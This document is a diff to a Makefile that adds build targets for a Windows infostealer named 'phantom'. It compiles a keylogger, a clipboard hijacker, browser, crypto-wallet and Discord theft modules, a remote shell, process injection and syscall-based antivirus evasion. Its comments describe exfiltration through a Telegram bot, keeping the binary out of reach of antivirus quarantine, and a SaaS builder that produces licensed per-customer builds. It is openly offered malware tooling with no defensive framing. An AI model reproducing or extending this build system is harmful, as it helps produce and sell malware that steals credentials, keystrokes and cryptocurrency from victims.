@@ -1,18 +1,24 @@
 # ── Toolchain detection — Windows (MSYS2) or Linux (cross-compile) ──────────
-ifeq ($(OS),Windows_NT)
+# $(OS) and COMSPEC are filtered by the MSYS2 runtime — use wildcard instead.
+_ON_WINDOWS := $(wildcard /c/Windows/System32/cmd.exe)
+ifneq ($(_ON_WINDOWS),)
+  # Windows / MSYS2
   MSYS2   ?= C:/msys64/mingw64
-  CC      ?= $(MSYS2)/bin/gcc.exe
-  STRIP   ?= $(MSYS2)/bin/strip.exe
-  OBJCOPY ?= $(MSYS2)/bin/objcopy.exe
-  WINDRES ?= $(MSYS2)/bin/windres.exe
+  CC      ?= gcc
+  CXX     ?= g++
+  STRIP   ?= strip
+  OBJCOPY ?= objcopy
+  WINDRES ?= windres
   PYTHON  ?= python
-  # Force linker temp dir (ld.exe ignores shell TEMP on some MSYS2 setups)
-  export TMP  := $(or $(TMP),$(TEMP),C:/Windows/Temp)
-  export TEMP := $(TMP)
+  # ld.exe (native PE) calls GetTempPath() — must see a real Windows path in TMP.
+  # cygpath -m converts POSIX /tmp → C:/msys64/tmp (forward slashes, writable).
+  _WIN_TEMP := $(shell cygpath -m /tmp 2>/dev/null)
+  _LD_ENV   := TMP='$(_WIN_TEMP)' TEMP='$(_WIN_TEMP)'
 else
-  # Ubuntu/Debian: apt install gcc-mingw-w64-x86-64 mingw-w64
+  # Linux cross-compile: apt install gcc-mingw-w64-x86-64 mingw-w64
   MSYS2   ?= /usr/x86_64-w64-mingw32
   CC      ?= x86_64-w64-mingw32-gcc
+  CXX     ?= x86_64-w64-mingw32-g++
   STRIP   ?= x86_64-w64-mingw32-strip
   OBJCOPY ?= x86_64-w64-mingw32-objcopy
   WINDRES ?= x86_64-w64-mingw32-windres
@@ -279,6 +285,7 @@ build-only: $(RES_OBJ)
 config:
 	$(PYTHON) tools/obfuscate.py
 	$(PYTHON) tools/gen_evs_strings.py
+	$(PYTHON) tools/encrypt_blob.py
 
 $(TARGET): $(SRC) $(RES_OBJ) include/agent_config.h
 	$(CC) $(CFLAGS) $(INCLUDE) $(SRC) $(RES_OBJ) $(LIBPATH) $(LIBS) $(LDFLAGS) -o $(TARGET)
@@ -302,10 +309,12 @@ strip: $(TARGET)
 chrome-helper:
 	$(CC) -O2 -shared -DNDEBUG -DWIN32_LEAN_AND_MEAN \
 	    $(INCLUDE) src/helpers/chrome_key_helper.c \
+	              src/helpers/ckh_reflect.c \
 	    -Wl,-Bstatic -lbcrypt -lkernel32 -static-libgcc \
 	    -o $(BUILDDIR)/chrome_key_helper.dll
-	$(PYTHON) tools/bin2h.py $(BUILDDIR)/chrome_key_helper.dll chrome_key_helper_dll > include/chrome_key_helper_blob.h
-	@echo "[ok] chrome_key_helper.dll + include/chrome_key_helper_blob.h"
+	$(PYTHON) tools/bin2h.py --xor 3BA7C15E --nibble $(BUILDDIR)/chrome_key_helper.dll chrome_key_helper_dll > include/chrome_key_helper_blob.h
+	$(PYTHON) tools/encrypt_blob.py
+	@echo "[ok] chrome_key_helper.dll + include/chrome_key_helper_blob.h (EVS_KEY encrypted)"
 
 relay:
 	$(CC) -O2 -Wall -DNDEBUG -DWIN32_LEAN_AND_MEAN \
@@ -331,4 +340,172 @@ else
 	rm -f $(BUILDDIR)/agent.exe $(BUILDDIR)/agent_res.o
 endif
 
-.PHONY: all standalone lean build-only debug stager stager-config stager-only shellcode-only reflective-dll-only bundle strip relay chrome-helper clean
+# ── Phantom stealer ─────────────────────────────────────────────────────────
+# Standalone, no C2 / beacon loop. Exfils via Telegram Bot API.
+# Usage: make phantom TG_TOKEN="bot:TOKEN" TG_CHAT="-100CHATID"
+#
+# Two-pass: C files with $(CC), C++ files with $(CXX), link with $(CXX).
+
+# Output dir outside OneDrive so AV/OneDrive can't quarantine the binary
+PHANTOM_OUT ?= C:/Dev/phantom_build
+
+PHANTOM_CF  = $(CFLAGS) -pipe $(INCLUDE)
+PHANTOM_CXF = -O2 -Wall -DNDEBUG -pipe \
+              -fno-ident -fno-stack-protector -std=c++17 \
+              -Ikeylogger $(INCLUDE)
+
+# All feature flags — full capability for normal phantom builds.
+# Builder overrides PHANTOM_FEAT_FLAGS to select features per-client.
+PHANTOM_ALL_FEATURES = -DHAVE_KEYLOGGER -DHAVE_CLIPJACK -DHAVE_SCREENSHOT \
+                       -DHAVE_BROWSER   -DHAVE_CRYPTO   -DHAVE_DISCORD    \
+                       -DHAVE_CLIPBOARD -DHAVE_SHELL
+PHANTOM_FEAT_FLAGS  ?= $(PHANTOM_ALL_FEATURES)
+PHANTOM_WATERMARK   ?=
+
+LIBS_PHANTOM = -Wl,-Bstatic -lmbedcrypto -lbcrypt \
+               -Wl,-Bstatic -lws2_32 -lwinhttp -ladvapi32 \
+                            -lwldap32 -lcrypt32 -lsecur32 \
+                            -lgdi32 -lole32 -loleaut32 -luuid \
+               -Wl,-Bstatic -lwinpthread \
+               -static-libstdc++ -static-libgcc
+
+phantom-c2: config
+	$(CC)  $(PHANTOM_CF)  $(PHANTOM_ALL_FEATURES) -c src/phantom_main.c -o ph_main.o
+	$(CC)  $(PHANTOM_CF)  -c src/c2_client.c                 -o ph_c2.o
+	$(CC)  $(PHANTOM_CF)  -c src/evs.c                       -o ph_evs.o
+	$(CC)  $(PHANTOM_CF)  -c src/adv_lazy.c                  -o ph_adv_lazy.o
+	$(CC)  $(PHANTOM_CF)  -c src/crypto/chacha.c             -o ph_chacha.o
+	$(CC)  $(PHANTOM_CF)  -c src/evasion/evasion.c           -o ph_evasion.o
+	$(CC)  $(PHANTOM_CF)  -c src/inject/spoof_stub.S         -o ph_spoof.o
+	$(CC)  $(PHANTOM_CF)  -c src/inject/inject.c             -o ph_inject.o
+	$(CC)  $(PHANTOM_CF)  -DHAVE_CHROME_INJECT -c src/commands/browser.c -o ph_browser.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/crypto.c           -o ph_crypto.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/screenshot.c       -o ph_screenshot.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/clipjack.c         -o ph_clipjack.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/clipboard.c        -o ph_clipboard.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/shell.c            -o ph_shell.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/ps.c               -o ph_ps.o
+	$(CC)  $(PHANTOM_CF)  -c src/helpers/chrome_key_helper.c -o ph_chrome.o
+	$(CXX) $(PHANTOM_CXF) -c src/keylogger_wrap.cpp          -o ph_kl_wrap.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/IndirectSyscalls.cpp  -o ph_isys.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/APIHashing.cpp        -o ph_apih.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/dosyscall.S           -o ph_dosc.o
+	$(PYTHON) -c "import os; os.makedirs(r'$(PHANTOM_OUT)', exist_ok=True)"
+	$(_LD_ENV) $(CXX) -o $(PHANTOM_OUT)/phantom.exe \
+	    ph_main.o ph_c2.o ph_evs.o ph_adv_lazy.o \
+	    ph_chacha.o ph_evasion.o ph_spoof.o ph_inject.o \
+	    ph_browser.o ph_crypto.o ph_screenshot.o \
+	    ph_clipjack.o ph_clipboard.o ph_shell.o ph_ps.o ph_chrome.o \
+	    ph_kl_wrap.o ph_isys.o ph_apih.o ph_dosc.o \
+	    $(LIBPATH) $(LIBS_PHANTOM) $(LDFLAGS)
+	-del /Q ph_*.o 2>nul
+	$(STRIP) --strip-all $(PHANTOM_OUT)/phantom.exe
+	$(OBJCOPY) --strip-debug $(PHANTOM_OUT)/phantom.exe
+	$(PYTHON) tools/pe_scrub.py $(PHANTOM_OUT)/phantom.exe
+	@echo "[ok] $(PHANTOM_OUT)/phantom.exe (C2 mode)"
+
+phantom-c2-dbg: config
+	$(CC)  $(PHANTOM_CF)  $(PHANTOM_ALL_FEATURES) -DPHANTOM_DEBUG -DSKIP_EVASION -c src/phantom_main.c -o ph_main.o
+	$(CC)  $(PHANTOM_CF)  -DPHANTOM_DEBUG -c src/c2_client.c                 -o ph_c2.o
+	$(CC)  $(PHANTOM_CF)  -c src/evs.c                       -o ph_evs.o
+	$(CC)  $(PHANTOM_CF)  -c src/adv_lazy.c                  -o ph_adv_lazy.o
+	$(CC)  $(PHANTOM_CF)  -c src/crypto/chacha.c             -o ph_chacha.o
+	$(CC)  $(PHANTOM_CF)  -c src/evasion/evasion.c           -o ph_evasion.o
+	$(CC)  $(PHANTOM_CF)  -c src/inject/spoof_stub.S         -o ph_spoof.o
+	$(CC)  $(PHANTOM_CF)  -c src/inject/inject.c             -o ph_inject.o
+	$(CC)  $(PHANTOM_CF)  -DHAVE_CHROME_INJECT -c src/commands/browser.c -o ph_browser.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/crypto.c           -o ph_crypto.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/screenshot.c       -o ph_screenshot.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/clipjack.c         -o ph_clipjack.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/clipboard.c        -o ph_clipboard.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/shell.c            -o ph_shell.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/ps.c               -o ph_ps.o
+	$(CC)  $(PHANTOM_CF)  -c src/helpers/chrome_key_helper.c -o ph_chrome.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_md5.c                   -o ph_no_md5.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_sha1.c                  -o ph_no_sha1.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_sha256.c                -o ph_no_sha256.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_sha512.c                -o ph_no_sha512.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_aes.c                   -o ph_no_aes.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_ripemd160.c             -o ph_no_ripemd160.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_aria.c                  -o ph_no_aria.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_chacha20.c              -o ph_no_chacha20.o
+	$(WINDRES) -i res/phantom.rc --input-format=rc -o ph_res.o --output-format=coff
+	$(CXX) $(PHANTOM_CXF) -DPHANTOM_DEBUG -c src/keylogger_wrap.cpp          -o ph_kl_wrap.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/IndirectSyscalls.cpp  -o ph_isys.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/APIHashing.cpp        -o ph_apih.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/dosyscall.S           -o ph_dosc.o
+	$(_LD_ENV) $(CXX) -o phantom_c2_dbg.exe \
+	    ph_main.o ph_c2.o ph_evs.o ph_adv_lazy.o \
+	    ph_chacha.o ph_evasion.o ph_spoof.o ph_inject.o \
+	    ph_browser.o ph_crypto.o ph_screenshot.o \
+	    ph_clipjack.o ph_clipboard.o ph_shell.o ph_ps.o ph_chrome.o \
+	    ph_kl_wrap.o ph_isys.o ph_apih.o ph_dosc.o ph_res.o \
+	    ph_no_md5.o ph_no_sha1.o ph_no_sha256.o ph_no_sha512.o ph_no_aes.o \
+	    ph_no_ripemd160.o ph_no_aria.o ph_no_chacha20.o \
+	    $(LIBPATH) $(LIBS_PHANTOM) -mconsole -static-libstdc++ -static-libgcc -Wl,--no-insert-timestamp
+ifeq ($(OS),Windows_NT)
+	del /Q ph_*.o 2>nul || true
+else
+	rm -f ph_*.o
+endif
+	@echo "[ok] phantom_c2_dbg.exe (C2 mode, debug console)"
+
+# phantom-c2-build-only — used by the SaaS builder API.
+# Config (str_enc.h / phantom_config.h) must be pre-written by the server.
+# PHANTOM_FEAT_FLAGS: subset of PHANTOM_ALL_FEATURES for this client build.
+# PHANTOM_WATERMARK:  -DBUILD_UUID=\"...\" embedded per-license.
+phantom-c2-build-only:
+	$(CC)  $(PHANTOM_CF)  $(PHANTOM_FEAT_FLAGS) $(PHANTOM_WATERMARK) \
+	    $(if $(PHANTOM_CLIPJACK_ADDRS),-DCLIPJACK_AUTOADDR=\"$(PHANTOM_CLIPJACK_ADDRS)\",) \
+	    -c src/phantom_main.c              -o ph_main.o
+	$(CC)  $(PHANTOM_CF)  -c src/c2_client.c                 -o ph_c2.o
+	$(CC)  $(PHANTOM_CF)  -c src/evs.c                       -o ph_evs.o
+	$(CC)  $(PHANTOM_CF)  -c src/adv_lazy.c                  -o ph_adv_lazy.o
+	$(CC)  $(PHANTOM_CF)  -c src/crypto/chacha.c             -o ph_chacha.o
+	$(CC)  $(PHANTOM_CF)  -c src/evasion/evasion.c           -o ph_evasion.o
+	$(CC)  $(PHANTOM_CF)  -c src/inject/spoof_stub.S         -o ph_spoof.o
+	$(CC)  $(PHANTOM_CF)  -c src/inject/inject.c             -o ph_inject.o
+	$(CC)  $(PHANTOM_CF)  -DHAVE_CHROME_INJECT -c src/commands/browser.c -o ph_browser.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/crypto.c           -o ph_crypto.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/screenshot.c       -o ph_screenshot.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/clipjack.c         -o ph_clipjack.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/clipboard.c        -o ph_clipboard.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/shell.c            -o ph_shell.o
+	$(CC)  $(PHANTOM_CF)  -c src/commands/ps.c               -o ph_ps.o
+	$(CC)  $(PHANTOM_CF)  -c src/helpers/chrome_key_helper.c -o ph_chrome.o
+	$(CC)  $(PHANTOM_CF)  -c src/wrap_ipfp.c                 -o ph_wrap_ipfp.o
+	$(CC)  $(PHANTOM_CF)  -c src/wrap_k32.c                  -o ph_wrap_k32.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_md5.c                    -o ph_no_md5.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_sha1.c                   -o ph_no_sha1.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_sha256.c                 -o ph_no_sha256.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_sha512.c                 -o ph_no_sha512.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_aes.c                    -o ph_no_aes.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_ripemd160.c              -o ph_no_ripemd160.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_aria.c                   -o ph_no_aria.o
+	$(CC)  $(PHANTOM_CF)  -c src/no_chacha20.c               -o ph_no_chacha20.o
+	$(WINDRES) -i res/phantom.rc --input-format=rc -o ph_res.o --output-format=coff
+	$(CXX) $(PHANTOM_CXF) -c src/keylogger_wrap.cpp          -o ph_kl_wrap.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/IndirectSyscalls.cpp  -o ph_isys.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/APIHashing.cpp        -o ph_apih.o
+	$(CXX) $(PHANTOM_CXF) -c keylogger/dosyscall.S           -o ph_dosc.o
+	$(PYTHON) -c "import os; os.makedirs(r'$(PHANTOM_OUT)', exist_ok=True)"
+	$(_LD_ENV) $(CXX) -o $(PHANTOM_OUT)/phantom.exe \
+	    ph_main.o ph_c2.o ph_evs.o ph_adv_lazy.o \
+	    ph_chacha.o ph_evasion.o ph_spoof.o ph_inject.o \
+	    ph_browser.o ph_crypto.o ph_screenshot.o \
+	    ph_clipjack.o ph_clipboard.o ph_shell.o ph_ps.o ph_chrome.o \
+	    ph_kl_wrap.o ph_isys.o ph_apih.o ph_dosc.o ph_wrap_ipfp.o ph_wrap_k32.o ph_res.o \
+	    ph_no_md5.o ph_no_sha1.o ph_no_sha256.o ph_no_sha512.o ph_no_aes.o \
+	    ph_no_ripemd160.o ph_no_aria.o ph_no_chacha20.o \
+	    $(LIBPATH) $(LIBS_PHANTOM) $(LDFLAGS) \
+	    -Wl,--wrap,IsProcessorFeaturePresent \
+	    -Wl,--wrap,BCryptGenRandom \
+	    -Wl,--wrap,rand \
+	    -Wl,--wrap,srand
+	-del /Q ph_*.o 2>nul
+	$(STRIP) --strip-all $(PHANTOM_OUT)/phantom.exe
+	$(OBJCOPY) --strip-debug $(PHANTOM_OUT)/phantom.exe
+	$(PYTHON) tools/pe_scrub.py $(PHANTOM_OUT)/phantom.exe
+	@echo "[ok] $(PHANTOM_OUT)/phantom.exe (build-only)"
+
+.PHONY: all standalone lean build-only debug stager stager-config stager-only shellcode-only reflective-dll-only bundle strip relay chrome-helper phantom-c2 phantom-c2-dbg phantom-c2-build-only clean
